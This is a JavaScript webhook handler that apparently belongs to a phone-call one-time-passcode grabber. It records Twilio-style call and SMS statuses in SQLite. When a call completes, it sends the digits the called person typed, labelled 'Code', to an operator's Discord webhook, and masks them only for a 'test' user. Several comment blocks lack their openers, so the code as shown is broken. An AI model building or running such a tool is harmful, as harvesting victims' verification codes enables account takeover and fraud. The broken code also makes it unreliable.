module.exports = function(request, response) {
     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
     */
    const config = require('.././config');
     * Instanciation des dépendences permettant l'utilisation du webhook discord
     */
    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');
    var itsfrom = request.body.From || null;
    var itsto = request.body.To || null;
    var sid = request.body.CallSid;
    var date = Date.now();
    var status;
    var table = null;
    var sidname = null;
    if (sid != undefined) {
        status = request.body.CallStatus;
        table = 'calls';
        sidname = 'callSid';
    } else {
        sid = request.body.SmsSid;
        status = request.body.SmsStatus;
        table = 'sms';
        sidname = 'smssid';
    }

    if (itsfrom == null || itsto == null || sid == undefined || sid == null) {
        return response.status(200).json({
            error: 'Please send all the needed post data.'
        });
    }
    db.get('SELECT ' + sidname + ' text FROM ' + table + ' WHERE ' + sidname + ' = ?', [sid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }
        if (row == undefined) {
            db.run('INSERT INTO ' + table + '(itsfrom, itsto, status, ' + sidname + ', date) VALUES(?, ?, ?, ?, ?)', [itsfrom, itsto, status, sid, date], function(err) {
                if (err) {
                    return console.log(err.message);
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });
        } else {
            db.run('UPDATE ' + table + ' SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ' + sidname + ' = ?', [status, itsfrom, itsto, date, sid], function(err) {
                if (err) {
                    return console.log(err.message);
                }
                if (table == 'calls' && status == 'completed' && config.discordwebhook != undefined) {
                    db.get('SELECT * FROM calls WHERE callSid  = ?', [sid], (err, row) => {
                        if (err) {
                            return console.error(err.message);
                        }
                        var embed;
                        if (row.digits == '' || row.digits == undefined) {
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('15105570')
                                .setDescription(':man_detective: The user did not respond or enter the code.')
                                .setFooter(row.user)
                                .setTimestamp();
                        } else {
                            if (row.user == 'test') row.digits = row.digits.slice(0, 3) + '***';
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('1752220')
                                .setDescription(`:man_detective: Code : **${row.digits}**`)
                                .setFooter(row.user)
                                .setTimestamp();
                        }
                        hook.send(embed);
                    });
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });


        }
    });
};